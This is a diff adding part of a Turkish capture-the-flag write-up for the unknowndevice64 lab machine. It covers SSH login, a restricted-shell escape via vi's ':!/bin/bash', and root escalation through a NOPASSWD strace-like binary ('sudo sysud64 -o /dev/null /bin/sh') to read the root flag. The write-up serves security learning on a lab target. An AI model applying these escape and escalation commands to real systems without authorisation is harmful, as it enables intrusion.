@@ -152,4 +152,123 @@ DOWNLOADED: 4612 - FOUND: 2
 <h3>3	Sisteme Sızma</h3>
 <pre>ssh ud64@192.168.171.137 -p 1337</pre>
 <p>Şifre olarak 1M!#64@ud girdiğimizde içerdeyiz.</p>
+<pre>ud64@unknowndevice64_v1:~$ whoami</pre>
+<pre>ud64</pre>
+<p>Terminalde bazı komutların çalışmadığını gördüm örnek olarak ls gibi bunun üzerine PATH'e bakmaya karar verdim.</p>
+<pre>ud64@unknowndevice64_v1:~$ echo $PATH/pre>
+<pre>/home/ud64/prog</pre>
+<p>PATH için bazı eklemeler yapmalıyız.</p>
+<pre>ud64@unknowndevice64_v1:~$ PATH = $PATH:/usr/bin/:/bin/:</pre>
+<pre>-rbash: PATH: command not found</pre>
+<pevet echo $SHELL yazdığımızda rbash içerisinde olduğumuzu görebiliriz. /bin/bash ya da sh bizim için en iyi tercihler olacağı için, PATH'ime gidip orada bulunan programlara bir baktım. Normal şartlar altında oralara gidemiyorum ancak ls yazmadan gerekli yolu azıp tab tuşuna bastığımda programlar listeniyordu.></p>
+<p>cd /home/ud64/prog/ yazdıp tab tuşuna bastığımda vi programını gördüm.</p>
+<pre>ud64@unknowndevice64_v1:~$ cd prog/
+date    id      vi      whoami </pre>
+<p>vi'nin içerisine girip </p>
+<pre>:!/bin/bash</pre>
+<pre>~
+~
+~
+~
+~
+~
+~
+~
+~
+bash-4.4$ 
+bash-4.4$ 
+bash-4.4$ 
+bash-4.4$ 
+bash-4.4$ 
+bash-4.4$ 
+bash-4.4$ </pre>
+<p>Ve artık bash ekranındayım. Ancak hala bir sorun var ls gibi komutlar için, bunun nedeni PATH. Ekleme işlemini yaptıktan sonra sorun ortadan kalakcaktır.
+<pre>bash-4.4$ PATH=$PATH:/bin/:/usr/bin/</pre>
+<pre>bash-4.4$ echo $PATH
+/home/ud64/prog:/bin/:/usr/bin/</pre>
+<p>Evet artık komutlarımız çalışmaktadır. Flag olarak bizden /root/flag.txt dosyasını okumamızı istiyorlar. Ancak /root klasörüne girmeye çalışırken yetki hatası ile karşılaşıyoruz.</p>
+<p>Kullanıcının erişime sahip olduğu programları listelemek için sudo -l'yi kullanabiliriz. BU komut aslında büyük projelerde orta çalışmalarda hangi kullanıcının hangi programları kullanabileceğini göstermek için kullanılıyor. Biz şimdilik bu düşüncenin dışına çıkarak kendi çıkarımızda kullanacağız.</p>
+<pre>bash-4.4$ sudo -l</pre>
+<pre>
+User ud64 may run the following commands on unknowndevice64_v1:
+    (ALL) NOPASSWD: /usr/bin/sysud64
+</pre>
+<p>/usr/bin/sysud64 -h yaptığımızda çıkan parametrelre bir fikir veriyordu ancak /usr/bin/sysud64 -V komutu ile bu uygulamanın bir strace olduğunu anladım. Strace ile birlikte çalıştırılan programlarda, programlara bağlanan stract sistem kaynaklarının nasıl kullanıldığını görmemize sağlar. Genel olarak debug ile ilgilenen ya da gömülü sistemcilerin kullandığı bir yapıdır.</p>
+<hr>
+<h4>4	Yetki Yükseltme</h4>
+<pre>bash-4.4$ ls /usr/bin/sysud64 -al</pre>
+<pre>
+-rwxr-xr-x 1 root root 957688 Dec 31 07:15 /usr/bin/sysud64
+</pre>
+<p>Görüldüğü üzere program root ve sudo -l çıktısı ile şifresiz bir şekilde kullanabileceğimizi görmüştük.</p>
+<p>Programı /bin/sh ile başlatırsak root olarak shell almış olacağızdır.</p>
+<pre>bash-4.4$ sudo sysud64 -o /dev/null /bin/sh</pre>
+<pre>sh-4.4# whoami
+root</pre>
+<p>Artık root'uz! program üzerinde -o /dev/null dememizin sebebi ekran çıktılarını null cihazına gönderdik ki ekrana basmasın.</p>
+<p>Şimdi flag'imizi okuyalım...</p>
+
+<pre>
+sh-4.4# cd /root/
+sh-4.4# ls
+Desktop  Documents  Downloads  Music  Pictures	Public	Videos	flag.txt
+sh-4.4# cat flag.txt 
+  ___    _                _                                  
+ / _ \  | |              | |                                 
+/ /_\ \ | |__   __ _  ___| | _____ _ __                      
+|  _  | | '_ \ / _` |/ __| |/ / _ \ '__|                     
+| | | | | | | | (_| | (__|   <  __/ |                        
+\_| |_/ |_| |_|\__,_|\___|_|\_\___|_|                        
+                                                             
+                                                             
+     _                    __             _                   
+    | |                  / _|           | |                  
+  __| | ___   ___  ___  | |_ ___  _ __  | | _____   _____    
+ / _` |/ _ \ / _ \/ __| |  _/ _ \| '__| | |/ _ \ \ / / _ \   
+| (_| | (_) |  __/\__ \ | || (_) | |    | | (_) \ V /  __/   
+ \__,_|\___/ \___||___/ |_| \___/|_|    |_|\___/ \_/ \___|   
+                                                             
+                                                             
+          _           _           _   _                      
+         | |         | |         | | | |                     
+__      _| |__   __ _| |_    ___ | |_| |__   ___ _ __ ___    
+\ \ /\ / / '_ \ / _` | __|  / _ \| __| '_ \ / _ \ '__/ __|   
+ \ V  V /| | | | (_| | |_  | (_) | |_| | | |  __/ |  \__ \   
+  \_/\_/ |_| |_|\__,_|\__|  \___/ \__|_| |_|\___|_|  |___/   
+                                                             
+                                                             
+                     _     _               _         _       
+                    | |   | |             | |       | |      
+__      _____  _   _| | __| |  _ __   ___ | |_    __| | ___  
+\ \ /\ / / _ \| | | | |/ _` | | '_ \ / _ \| __|  / _` |/ _ \ 
+ \ V  V / (_) | |_| | | (_| | | | | | (_) | |_  | (_| | (_) |
+  \_/\_/ \___/ \__,_|_|\__,_| |_| |_|\___/ \__|  \__,_|\___/ 
+                                                             
+                                                             
+  __                                                         
+ / _|                                                        
+| |_ ___  _ __   _ __ ___   ___  _ __   ___ _   _            
+|  _/ _ \| '__| | '_ ` _ \ / _ \| '_ \ / _ \ | | |           
+| || (_) | |    | | | | | | (_) | | | |  __/ |_| |_          
+|_| \___/|_|    |_| |_| |_|\___/|_| |_|\___|\__, (_)         
+                                             __/ |           
+                                            |___/            
+
+
+
+   _   _   _   _   _   _   _   _   _   _   _   _   _   _   _   _   _  
+  / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ 
+ ( . | / | u | n | k | n | o | w | n | d | e | v | i | c | e | 6 | 4 )
+  \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ 
+
+sh-4.4# 
+</pre>
+
+<hr>
+<pre>
+<h4>Kaynaklar:<h4>
+https://bencane.com/2011/08/17/sudo-list-available-commands/
+https://medium.com/@gokhansengun/strace-ne-i%C5%9Fe-yarar-ve-nas%C4%B1l-kullan%C4%B1l%C4%B1r-c46036ffa0
+https://tr.wikipedia.org/wiki/Brainfuck
+</pre>
 
